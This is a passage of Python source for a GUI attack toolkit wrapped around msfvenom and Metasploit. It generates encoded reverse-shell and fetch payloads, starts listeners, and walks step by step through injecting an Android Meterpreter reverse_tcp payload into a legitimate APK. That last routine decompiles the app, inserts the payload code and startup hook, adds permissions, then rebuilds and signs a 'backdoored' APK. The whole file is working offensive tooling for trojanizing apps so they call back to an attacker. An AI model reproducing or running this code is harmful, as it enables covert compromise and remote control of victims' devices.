            if self.use_encoding_var.get():
                cmd_parts.extend(["-e", self.encoder_var.get()])
                cmd_parts.extend(["-i", str(self.iterations_var.get())])
            
            # FIXED: For Android platform, always use raw format with .apk extension
            if platform == "android":
                # Always use raw format for Android
                cmd_parts.extend(["-f", "raw"])
                # Always use .apk extension for Android
                output_file = "{}/{}.apk".format(self.toolkit.output_dir, payload_name)
                self.update_status("Note: For Android payloads, using raw format with .apk extension")
            else:
                # For non-Android platforms, use the selected format
                cmd_parts.extend(["-f", output_format])
                output_file = "{}/{}.{}".format(self.toolkit.output_dir, payload_name, output_format)
            
            # Add output file
            cmd_parts.extend(["-o", output_file])
            
            command = " ".join(cmd_parts)
            self.update_status("Generated command: {}".format(command))
            
            # Execute the command in a separate thread
            threading.Thread(target=self.execute_command_thread, args=(command,), daemon=True).start()
            
            # Ask if user wants to start handler
            if messagebox.askyesno("Start Handler", "Do you want to start the Metasploit handler?"):
                self.start_handler_from_tab()
                
        except Exception as e:
            messagebox.showerror("Error", "Failed to generate payload: {}".format(str(e)))
            self.update_status("Error generating payload: {}".format(str(e)))
    
    def inject_android_payload(self):
        """Inject a payload into an original APK."""
        try:
            # Get values from GUI
            lhost = self.android_lhost_var.get()
            lport = self.android_lport_var.get()
            payload_name = self.android_payload_name_var.get()
            original_apk = self.original_apk_var.get()
            
            # Validate inputs
            if not lhost or not lport or not payload_name or not original_apk:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            if not os.path.exists(original_apk):
                messagebox.showerror("File Error", "APK file not found: {}".format(original_apk))
                return
            
            # Get selected permissions
            selected_permissions = []
            for perm_group, var in self.android_permissions.items():
                if var.get():
                    selected_permissions.extend(
                        self.toolkit.android_configs["permissions"][perm_group]
                    )
            
            # Update toolkit settings
            self.toolkit.config["android_settings"]["keystore_path"] = self.keystore_path_var.get()
            self.toolkit.config["android_settings"]["keystore_password"] = self.keystore_pass_var.get()
            self.toolkit.config["android_settings"]["key_alias"] = self.key_alias_var.get()
            self.toolkit.config["android_settings"]["key_password"] = self.key_pass_var.get()
            
            # Execute in a separate thread
            threading.Thread(
                target=self.inject_android_payload_thread,
                args=(lhost, lport, payload_name, original_apk, selected_permissions),
                daemon=True
            ).start()
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to inject payload: {}".format(str(e)))
            self.update_status("Error injecting payload: {}".format(str(e)))
    
    def inject_android_payload_thread(self, lhost, lport, payload_name, original_apk, selected_permissions):
        """Inject Android payload in a separate thread."""
        try:
            self.update_status("Starting Android payload injection...")
            
            # Create temporary directory for processing
            temp_dir = tempfile.mkdtemp()
            
            self.update_status("Working directory: {}".format(temp_dir))
            
            # Step 1: Generate the raw payload APK
            self.update_status("Step 1: Generating raw payload APK...")
            payload_apk = os.path.join(temp_dir, "payload.apk")
            cmd = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                "LHOST={}".format(lhost),
                "LPORT={}".format(lport),
                "-o", payload_apk
            ]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to generate payload APK")
                return
            
            self.update_status("Payload APK generated: {}".format(payload_apk))
            
            # Step 2: Decompile payload APK
            self.update_status("Step 2: Decompiling payload APK...")
            payload_src = os.path.join(temp_dir, "payload_src")
            cmd = ["apktool", "d", payload_apk, "-o", payload_src]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to decompile payload APK")
                return
            
            self.update_status("Payload APK decompiled to: {}".format(payload_src))
            
            # Step 3: Decompile original APK
            self.update_status("Step 3: Decompiling original APK...")
            legit_src = os.path.join(temp_dir, "legit_src")
            cmd = ["apktool", "d", original_apk, "-o", legit_src]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to decompile original APK")
                return
            
            self.update_status("Original APK decompiled to: {}".format(legit_src))
            
            # Step 4: Copy payload smali to legitimate app
            self.update_status("Step 4: Copying payload smali to legitimate app...")
            metasploit_smali = os.path.join(payload_src, "smali", "com", "metasploit")
            target_smali = os.path.join(legit_src, "smali", "com")
            
            if not os.path.exists(metasploit_smali):
                self.update_status("Metasploit smali directory not found: {}".format(metasploit_smali))
                return
            
            # Copy the entire metasploit smali directory
            if os.path.exists(target_smali):
                shutil.rmtree(target_smali)
            shutil.copytree(metasploit_smali, target_smali)
            self.update_status("Copied payload smali to legitimate app")
            
            # Step 5: Find main activity and inject payload startup code
            self.update_status("Step 5: Injecting payload startup code...")
            
            # Parse AndroidManifest.xml to find main activity
            manifest_path = os.path.join(legit_src, "AndroidManifest.xml")
            main_activity = self.toolkit.find_main_activity(manifest_path)
            
            if not main_activity:
                self.update_status("Failed to find main activity in AndroidManifest.xml")
                return
            
            self.update_status("Found main activity: {}".format(main_activity))
            
            # Convert main activity path to smali file path
            main_activity_path = main_activity.replace(".", "/")
            main_activity_smali = os.path.join(legit_src, "smali", "{}.smali".format(main_activity_path))
            
            if not os.path.exists(main_activity_smali):
                # Try with $ if it's an inner class
                main_activity_smali = os.path.join(legit_src, "smali", "{}.smali".format(main_activity_path.replace('$', '$$')))
            
            if not os.path.exists(main_activity_smali):
                self.update_status("Main activity smali file not found: {}".format(main_activity_smali))
                return
            
            # Inject payload startup code
            if not self.toolkit.inject_payload_startup(main_activity_smali):
                self.update_status("Failed to inject payload startup code")
                return
            
            self.update_status("Injected payload startup code into main activity")
            
            # Step 6: Add required permissions and service to AndroidManifest.xml
            self.update_status("Step 6: Modifying AndroidManifest.xml...")
            
            if not self.toolkit.modify_android_manifest(manifest_path, selected_permissions):
                self.update_status("Failed to modify AndroidManifest.xml")
                return
            
            self.update_status("Modified AndroidManifest.xml")
            
            # Step 7: Rebuild the APK
            self.update_status("Step 7: Rebuilding APK...")
            unsigned_apk = os.path.join(temp_dir, "unsigned_backdoor.apk")
            cmd = ["apktool", "b", legit_src, "-o", unsigned_apk]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to rebuild APK")
                return
            
            self.update_status("Rebuilt APK: {}".format(unsigned_apk))
            
            # Step 8: Create signing key if it doesn't exist
            self.update_status("Step 8: Creating signing key...")
            keystore_path = self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore")
            
            if not os.path.exists(keystore_path):
                cmd = [
                    "keytool",
                    "-genkey",
                    "-v",
                    "-keystore", keystore_path,
                    "-alias", self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"),
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-storepass", self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"),
                    "-keypass", self.toolkit.config.get("android_settings", {}).get("key_password", "android"),
                    "-dname", "CN=Android, OU=Android, O=Android, L=Android, S=Android, C=US"
                ]
                
                if not self.toolkit.execute_command(" ".join(cmd)):
                    self.update_status("Failed to create signing key")
                    return
                
                self.update_status("Created signing key: {}".format(keystore_path))
            else:
                self.update_status("Using existing signing key: {}".format(keystore_path))
            
            # Step 9: Sign the APK
            self.update_status("Step 9: Signing APK...")
            signed_apk = os.path.join(temp_dir, "signed_backdoor.apk")
            cmd = [
                "jarsigner",
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", keystore_path,
                "-storepass", self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"),
                "-keypass", self.toolkit.config.get("android_settings", {}).get("key_password", "android"),
                "-signedjar", signed_apk,
                unsigned_apk,
                self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey")
            ]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to sign APK")
                return
            
            self.update_status("Signed APK: {}".format(signed_apk))
            
            # Step 10: Align the APK (optional but recommended)
            self.update_status("Step 10: Aligning APK...")
            final_apk = os.path.join(self.toolkit.output_dir, "{}.apk".format(payload_name))
            cmd = ["zipalign", "-v", "4", signed_apk, final_apk]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Warning: Failed to align APK, using signed APK instead")
                shutil.copy2(signed_apk, final_apk)
            else:
                self.update_status("Aligned APK: {}".format(final_apk))
            
            self.update_status("Backdoored APK generated successfully: {}".format(final_apk))
            self.update_status("This APK should work on Android 10-15")
            
            # Clean up temporary directory
            shutil.rmtree(temp_dir)
            
            # Ask if user wants to start handler
            if messagebox.askyesno("Start Handler", "Do you want to start the Metasploit handler?"):
                self.start_android_handler()
                
        except Exception as e:
            self.update_status("Error injecting Android payload: {}".format(str(e)))
            messagebox.showerror("Error", "Failed to inject payload: {}".format(str(e)))
    
    def generate_fetch_payload(self):
        """Generate a fetch payload."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_var.get()
            protocol = self.fetch_protocol_var.get()
            lhost = self.fetch_lhost_var.get()
            lport = self.fetch_lport_var.get()
            fetch_srvhost = self.fetch_srvhost_var.get()
            fetch_srvport = self.fetch_srvport_var.get()
            payload_name = self.fetch_payload_name_var.get()
            
            # Validate inputs
            if not lhost or not lport or not fetch_srvhost or not fetch_srvport or not payload_name:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Build the fetch payload command
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        messagebox.showerror("Error", "Protocol {} not supported for {}".format(protocol, platform))
                        return
                else:
                    messagebox.showerror("Error", "Fetch payloads are not supported for {}".format(platform))
                    return
            else:
                messagebox.showerror("Error", "Platform {} not supported".format(platform))
                return
            
            # Build the command
            command = (
                "msfvenom -p {} "
                "LHOST={} "
                "LPORT={} "
                "FETCH_SRVHOST={} "
                "FETCH_SRVPORT={} "
                "-f raw"
            ).format(payload, lhost, lport, fetch_srvhost, fetch_srvport)
            
            self.update_status("Generated command: {}".format(command))
            
            # Execute the command in a separate thread
            threading.Thread(target=self.execute_command_thread, args=(command,), daemon=True).start()
            
            # Ask if user wants to start handler
            if messagebox.askyesno("Start Handler", "Do you want to start the Metasploit handler?"):
                self.start_fetch_handler()
                
        except Exception as e:
            messagebox.showerror("Error", "Failed to generate fetch payload: {}".format(str(e)))
            self.update_status("Error generating fetch payload: {}".format(str(e)))
    
    def generate_multi_format_payload(self):
        """Generate multiple formats of the same payload."""
        try:
            # Get values from GUI
            platform = self.multi_platform_var.get()
            payload_type = self.multi_payload_type_var.get()
            conn_method = self.multi_conn_method_var.get()
            lhost = self.multi_lhost_var.get()
            lport = self.multi_lport_var.get()
            payload_name = self.multi_payload_name_var.get()
            
            # Validate inputs
            if not lhost or not lport or not payload_name:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            messagebox.showerror("Error", "Connection method {} not supported for {} {}".format(conn_method, platform, payload_type))
                            return
                    else:
                        messagebox.showerror("Error", "Payload type {} not supported for {}".format(payload_type, platform))
                        return
                else:
                    messagebox.showerror("Error", "Platform {} not supported".format(platform))
                    return
            
            # Get formats
            formats = self.toolkit.payload_configs[platform]["formats"]
            self.update_status("Generating payload in {} formats...".format(len(formats)))
            
            # Execute in a separate thread
            threading.Thread(
                target=self.generate_multi_format_payload_thread,
                args=(payload, lhost, lport, payload_name, formats),
                daemon=True
            ).start()
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to generate multi-format payload: {}".format(str(e)))
            self.update_status("Error generating multi-format payload: {}".format(str(e)))
    
    def generate_multi_format_payload_thread(self, payload, lhost, lport, payload_name, formats):
        """Generate multi-format payload in a separate thread."""
        try:
            success_count = 0
            for fmt in formats:
                # Build the command for this format
                cmd_parts = ["msfvenom", "-p", payload]
                
                # Add LHOST and LPORT
                cmd_parts.extend(["LHOST={}".format(lhost), "LPORT={}".format(lport)])
                
                # Add encoding options if selected
                if self.multi_use_encoding_var.get():
                    cmd_parts.extend(["-e", self.multi_encoder_var.get()])
                    cmd_parts.extend(["-i", str(self.multi_iterations_var.get())])
                
                # Add format
                cmd_parts.extend(["-f", fmt])
                
                # Add output file
                output_file = "{}/{}.{}".format(self.toolkit.output_dir, payload_name, fmt)
                cmd_parts.extend(["-o", output_file])
                
                command = " ".join(cmd_parts)
                
                self.update_status("Generating {} format...".format(fmt))
                if self.toolkit.execute_command(command):
                    self.update_status("Generated: {}".format(output_file))
                    success_count += 1
                else:
                    self.update_status("Failed to generate {} format".format(fmt))
            
            self.update_status("Summary: {}/{} formats generated successfully".format(success_count, len(formats)))
            
            # Ask if user wants to start handler
            if success_count > 0 and messagebox.askyesno("Start Handler", "Do you want to start the Metasploit handler?"):
                self.start_multi_handler()
                
        except Exception as e:
            self.update_status("Error generating multi-format payload: {}".format(str(e)))
    
    def start_listener(self):
        """Start a Metasploit listener."""
        try:
            # Get values from GUI
            payload = self.listener_payload_var.get()
            lhost = self.listener_lhost_var.get()
            lport = self.listener_lport_var.get()
            
            # Validate inputs
            if not lhost or not lport:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Update toolkit settings
            self.toolkit.config["open_terminal_for_handler"] = self.open_terminal_var.get()
            self.toolkit.config["terminal_emulator"] = self.terminal_var.get()
            self.toolkit.config["terminal_title"] = self.terminal_title_var.get()
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to start listener: {}".format(str(e)))
            self.update_status("Error starting listener: {}".format(str(e)))
    
    def start_handler_from_tab(self):
        """Start a handler from the traditional payload tab."""
        try:
            # Get values from GUI
            platform = self.platform_var.get()
            payload_type = self.payload_type_var.get()
            conn_method = self.conn_method_var.get()
            lhost = self.lhost_var.get()
            lport = self.lport_var.get()
            
            # Validate inputs
            if not lhost or not lport:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            messagebox.showerror("Error", "Connection method {} not supported for {} {}".format(conn_method, platform, payload_type))
                            return
                    else:
                        messagebox.showerror("Error", "Payload type {} not supported for {}".format(payload_type, platform))
                        return
                else:
                    messagebox.showerror("Error", "Platform {} not supported".format(platform))
                    return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to start handler: {}".format(str(e)))
            self.update_status("Error starting handler: {}".format(str(e)))
    
    def start_android_handler(self):
        """Start an Android handler from the Android injection tab."""
        try:
            # Get values from GUI
            lhost = self.android_lhost_var.get()
            lport = self.android_lport_var.get()
            
            # Validate inputs
            if not lhost or not lport:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Start the handler
            self.toolkit.start_metasploit_handler("android/meterpreter/reverse_tcp", lhost, lport)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to start handler: {}".format(str(e)))
            self.update_status("Error starting handler: {}".format(str(e)))
    
    def start_fetch_handler(self):
        """Start a fetch handler from the fetch payload tab."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_var.get()
            protocol = self.fetch_protocol_var.get()
            lhost = self.fetch_lhost_var.get()
            lport = self.fetch_lport_var.get()
            
            # Validate inputs
            if not lhost or not lport:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        messagebox.showerror("Error", "Protocol {} not supported for {}".format(protocol, platform))
                        return
                else:
                    messagebox.showerror("Error", "Fetch payloads are not supported for {}".format(platform))
                    return
            else:
                messagebox.showerror("Error", "Platform {} not supported".format(platform))
                return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to start handler: {}".format(str(e)))
            self.update_status("Error starting handler: {}".format(str(e)))
    
    def start_multi_handler(self):
        """Start a multi-format handler from the multi-format tab."""
        try:
            # Get values from GUI
            platform = self.multi_platform_var.get()
            payload_type = self.multi_payload_type_var.get()
            conn_method = self.multi_conn_method_var.get()
            lhost = self.multi_lhost_var.get()
            lport = self.multi_lport_var.get()
            
            # Validate inputs
            if not lhost or not lport:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            messagebox.showerror("Error", "Connection method {} not supported for {} {}".format(conn_method, platform, payload_type))
                            return
                    else:
                        messagebox.showerror("Error", "Payload type {} not supported for {}".format(payload_type, platform))
                        return
                else:
                    messagebox.showerror("Error", "Platform {} not supported".format(platform))
                    return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to start handler: {}".format(str(e)))
            self.update_status("Error starting handler: {}".format(str(e)))
    
    def view_command(self):
        """View the command that would be executed."""
        try:
            # Get values from GUI
            platform = self.platform_var.get()
            payload_type = self.payload_type_var.get()
            conn_method = self.conn_method_var.get()
            output_format = self.format_var.get()
            lhost = self.lhost_var.get()
            lport = self.lport_var.get()
            payload_name = self.payload_name_var.get()
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            messagebox.showerror("Error", "Connection method {} not supported for {} {}".format(conn_method, platform, payload_type))
                            return
                    else:
                        messagebox.showerror("Error", "Payload type {} not supported for {}".format(payload_type, platform))
                        return
                else:
                    messagebox.showerror("Error", "Platform {} not supported".format(platform))
                    return
            
            # Start building the command
            cmd_parts = ["msfvenom", "-p", payload]
            
            # Add LHOST and LPORT
            cmd_parts.extend(["LHOST={}".format(lhost), "LPORT={}".format(lport)])
            
            # Add encoding options if selected
            if self.use_encoding_var.get():
                cmd_parts.extend(["-e", self.encoder_var.get()])
                cmd_parts.extend(["-i", str(self.iterations_var.get())])
            
            # FIXED: For Android platform, always use raw format with .apk extension
            if platform == "android":
                # Always use raw format for Android
                cmd_parts.extend(["-f", "raw"])
                # Always use .apk extension for Android
                output_file = "{}/{}.apk".format(self.toolkit.output_dir, payload_name)
            else:
                # For non-Android platforms, use the selected format
                cmd_parts.extend(["-f", output_format])
                output_file = "{}/{}.{}".format(self.toolkit.output_dir, payload_name, output_format)
            
            # Add output file
            cmd_parts.extend(["-o", output_file])
            
            command = " ".join(cmd_parts)
            
            # Show the command in a dialog
            command_window = tk.Toplevel(self.root)
            command_window.title("Generated Command")
            command_window.geometry("800x200")
            
            if PY3:
                command_text = scrolledtext.ScrolledText(command_window, wrap=tk.WORD, width=80, height=10)
            else:
                command_text = ScrolledText.ScrolledText(command_window, wrap=tk.WORD, width=80, height=10)
            
            command_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            command_text.insert(tk.END, command)
            command_text.config(state=tk.DISABLED)
            
            copy_button = ttk.Button(command_window, text="Copy to Clipboard", 
                                    command=lambda: self.root.clipboard_clear() or self.root.clipboard_append(command))
            copy_button.pack(pady=5)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to generate command: {}".format(str(e)))
            self.update_status("Error generating command: {}".format(str(e)))
    
    def view_fetch_command(self):
        """View the fetch command that would be executed."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_var.get()
            protocol = self.fetch_protocol_var.get()
            lhost = self.fetch_lhost_var.get()
            lport = self.fetch_lport_var.get()
            fetch_srvhost = self.fetch_srvhost_var.get()
            fetch_srvport = self.fetch_srvport_var.get()
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        messagebox.showerror("Error", "Protocol {} not supported for {}".format(protocol, platform))
                        return
                else:
                    messagebox.showerror("Error", "Fetch payloads are not supported for {}".format(platform))
                    return
            else:
                messagebox.showerror("Error", "Platform {} not supported".format(platform))
                return
            
            # Build the command
            command = (
                "msfvenom -p {} "
                "LHOST={} "
                "LPORT={} "
                "FETCH_SRVHOST={} "
                "FETCH_SRVPORT={} "
                "-f raw"
            ).format(payload, lhost, lport, fetch_srvhost, fetch_srvport)
            
            # Show the command in a dialog
            command_window = tk.Toplevel(self.root)
            command_window.title("Generated Command")
            command_window.geometry("800x200")
            
            if PY3:
                command_text = scrolledtext.ScrolledText(command_window, wrap=tk.WORD, width=80, height=10)
            else:
                command_text = ScrolledText.ScrolledText(command_window, wrap=tk.WORD, width=80, height=10)
            
            command_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            command_text.insert(tk.END, command)
            command_text.config(state=tk.DISABLED)
            
            copy_button = ttk.Button(command_window, text="Copy to Clipboard", 
                                    command=lambda: self.root.clipboard_clear() or self.root.clipboard_append(command))
            copy_button.pack(pady=5)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to generate command: {}".format(str(e)))
            self.update_status("Error generating command: {}".format(str(e)))
    
    def execute_command_thread(self, command):
        """Execute a command in a separate thread."""
        try:
            self.update_status("Executing command: {}".format(command))
            
            if PY3:
                # Python 3 - use subprocess.run
                result = subprocess.run(
                    command,
                    shell=True,
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result.returncode == 0:
                    self.update_status("Command executed successfully")
                    if result.stdout:
                        self.update_status("Output: {}".format(result.stdout))
                    messagebox.showinfo("Success", "Payload generated successfully!")
                else:
                    self.update_status("Command failed with return code {}".format(result.returncode))
                    self.update_status("Error: {}".format(result.stderr))
                    messagebox.showerror("Error", "Failed to generate payload: {}".format(result.stderr))
            else:
                # Python 2 - use subprocess.call
                result = subprocess.call(
                    command,
                    shell=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result == 0:
                    self.update_status("Command executed successfully")
                    messagebox.showinfo("Success", "Payload generated successfully!")
                else:
                    self.update_status("Command failed with return code {}".format(result))
                    messagebox.showerror("Error", "Failed to generate payload. Check the log for details.")
                
        except subprocess.TimeoutExpired:
            self.update_status("Command timed out")
            messagebox.showerror("Error", "Command timed out")
        except Exception as e:
            self.update_status("Unexpected error: {}".format(e))
            messagebox.showerror("Error", "Unexpected error: {}".format(str(e)))
    
    def save_listener_settings(self):
        """Save the listener settings."""
        try:
            # Update toolkit settings
            self.toolkit.config["open_terminal_for_handler"] = self.open_terminal_var.get()
            self.toolkit.config["terminal_emulator"] = self.terminal_var.get()
            self.toolkit.config["terminal_title"] = self.terminal_title_var.get()
            
            # Save configuration
            self.toolkit.save_config()
            
            messagebox.showinfo("Success", "Listener settings saved successfully!")
            self.update_status("Listener settings saved successfully")
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to save settings: {}".format(str(e)))
            self.update_status("Error saving settings: {}".format(str(e)))
    
    def save_settings(self):
        """Save the settings."""
        try:
            # Update toolkit settings
            self.toolkit.config['default_lhost'] = self.default_lhost_var.get()
            self.toolkit.config['default_lport'] = self.default_lport_var.get()
            self.toolkit.config['default_encoder'] = self.default_encoder_var.get()
            self.toolkit.config['default_format'] = self.default_format_var.get()
            self.toolkit.config['auto_start_handler'] = self.auto_start_handler_var.get()
            self.toolkit.config['auto_detect_ip'] = self.auto_detect_ip_var.get()
            self.toolkit.config["terminal_emulator"] = self.term_emulator_var.get()
            self.toolkit.config["open_terminal_for_handler"] = self.term_open_var.get()
            self.toolkit.config["terminal_title"] = self.term_title_var.get()
            
            # Update Android settings
            self.toolkit.config["android_settings"]["target_sdk"] = self.android_target_sdk_var.get()
            self.toolkit.config["android_settings"]["evasion_technique"] = self.android_evasion_var.get()
            self.toolkit.config["android_settings"]["keystore_path"] = self.android_keystore_path_var.get()
            self.toolkit.config["android_settings"]["keystore_password"] = self.android_keystore_pass_var.get()
            self.toolkit.config["android_settings"]["key_alias"] = self.android_key_alias_var.get()
            self.toolkit.config["android_settings"]["key_password"] = self.android_key_pass_var.get()
            
            # Save configuration
            self.toolkit.save_config()
            
            messagebox.showinfo("Success", "Settings saved successfully!")
            self.update_status("Settings saved successfully")
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to save settings: {}".format(str(e)))
            self.update_status("Error saving settings: {}".format(str(e)))
    
    def reset_settings(self):
        """Reset settings to defaults."""
        try:
            if messagebox.askyesno("Reset Settings", "Are you sure you want to reset all settings to defaults?"):
                # Create default configuration
                self.toolkit.config = self.toolkit.load_config()
                
                # Update GUI variables
                self.default_lhost_var.set(self.toolkit.config.get('default_lhost', '192.168.1.100'))
                self.default_lport_var.set(self.toolkit.config.get('default_lport', '4444'))
                self.default_encoder_var.set(self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
                self.default_format_var.set(self.toolkit.config.get('default_format', 'exe'))
                self.auto_start_handler_var.set(self.toolkit.config.get('auto_start_handler', False))
                self.auto_detect_ip_var.set(self.toolkit.config.get('auto_detect_ip', True))
                self.term_emulator_var.set(self.toolkit.config.get("terminal_emulator", "auto"))
                self.term_open_var.set(self.toolkit.config.get("open_terminal_for_handler", True))
                self.term_title_var.set(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
                
                # Update Android settings
                android_settings = self.toolkit.config.get("android_settings", {})
                self.android_target_sdk_var.set(android_settings.get("target_sdk", "android_11"))
                self.android_evasion_var.set(android_settings.get("evasion_technique", "apk_wrapper"))
                self.android_keystore_path_var.set(android_settings.get("keystore_path", "mykey.keystore"))
                self.android_keystore_pass_var.set(android_settings.get("keystore_password", "android"))
                self.android_key_alias_var.set(android_settings.get("key_alias", "mykey"))
                self.android_key_pass_var.set(android_settings.get("key_password", "android"))
                
                # Save configuration
                self.toolkit.save_config()
                
                messagebox.showinfo("Success", "Settings reset to defaults!")
                self.update_status("Settings reset to defaults")
                
        except Exception as e:
            messagebox.showerror("Error", "Failed to reset settings: {}".format(str(e)))
            self.update_status("Error resetting settings: {}".format(str(e)))
    
    def save_preset_config(self):
        """Save the current configuration as a preset."""
        try:
            # Ask for preset name
            preset_name = simpledialog.askstring("Save Preset", "Enter preset name:")
            if not preset_name:
                return
            
            # Save preset
            preset_file = "preset_{}.json".format(preset_name)
            with open(preset_file, 'w') as f:
                json.dump(self.toolkit.config, f, indent=2)
            
            messagebox.showinfo("Success", "Preset saved as {}".format(preset_file))
            self.update_status("Preset saved as {}".format(preset_file))
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to save preset: {}".format(str(e)))
            self.update_status("Error saving preset: {}".format(str(e)))
    
    def load_preset_config(self):
        """Load a preset configuration."""
        try:
            # List available presets
            presets = [f for f in os.listdir('.') if f.startswith('preset_') and f.endswith('.json')]
            
            if not presets:
                messagebox.showinfo("No Presets", "No preset configurations found.")
                return
            
            # Create a dialog to select preset
            preset_dialog = tk.Toplevel(self.root)
            preset_dialog.title("Load Preset")
            preset_dialog.geometry("400x300")
            
            ttk.Label(preset_dialog, text="Select a preset to load:").pack(pady=10)
            
            preset_listbox = tk.Listbox(preset_dialog)
            preset_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            for preset in presets:
                preset_listbox.insert(tk.END, preset[7:-5])  # Remove 'preset_' prefix and '.json' suffix
            
            def load_selected_preset():
                selection = preset_listbox.curselection()
                if selection:
                    preset_index = selection[0]
                    preset_file = presets[preset_index]
                    
                    try:
                        with open(preset_file, 'r') as f:
                            self.toolkit.config = json.load(f)
                        
                        # Update GUI variables
                        self.default_lhost_var.set(self.toolkit.config.get('default_lhost', '192.168.1.100'))
                        self.default_lport_var.set(self.toolkit.config.get('default_lport', '4444'))
                        self.default_encoder_var.set(self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
                        self.default_format_var.set(self.toolkit.config.get('default_format', 'exe'))
                        self.auto_start_handler_var.set(self.toolkit.config.get('auto_start_handler', False))
                        self.auto_detect_ip_var.set(self.toolkit.config.get('auto_detect_ip', True))
                        self.term_emulator_var.set(self.toolkit.config.get("terminal_emulator", "auto"))
                        self.term_open_var.set(self.toolkit.config.get("open_terminal_for_handler", True))
                        self.term_title_var.set(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
                        
                        # Update Android settings
                        android_settings = self.toolkit.config.get("android_settings", {})
                        self.android_target_sdk_var.set(android_settings.get("target_sdk", "android_11"))
                        self.android_evasion_var.set(android_settings.get("evasion_technique", "apk_wrapper"))
                        self.android_keystore_path_var.set(android_settings.get("keystore_path", "mykey.keystore"))
                        self.android_keystore_pass_var.set(android_settings.get("keystore_password", "android"))
                        self.android_key_alias_var.set(android_settings.get("key_alias", "mykey"))
                        self.android_key_pass_var.set(android_settings.get("key_password", "android"))
                        
                        messagebox.showinfo("Success", "Preset '{}' loaded successfully".format(preset_file[7:-5]))
                        self.update_status("Preset '{}' loaded successfully".format(preset_file[7:-5]))
                        preset_dialog.destroy()
                        
